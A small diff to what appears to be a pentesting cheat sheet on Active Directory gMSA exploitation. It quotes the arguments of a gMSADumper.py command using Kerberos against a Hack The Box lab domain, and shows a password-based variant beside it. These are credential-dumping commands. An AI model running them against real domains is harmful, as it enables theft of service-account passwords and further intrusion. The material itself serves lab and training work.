@@ -45,7 +45,7 @@
  python3 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
  
  # With Kerberos
- python3 gMSADumper.py -k -d vintage.htb -l dc01.vintage.htb
+ python3 gMSADumper.py -k -d 'vintage.htb' -l 'dc01.vintage.htb'
  ```
 ## Exploitation from Windows
 ### AD and DSInternals
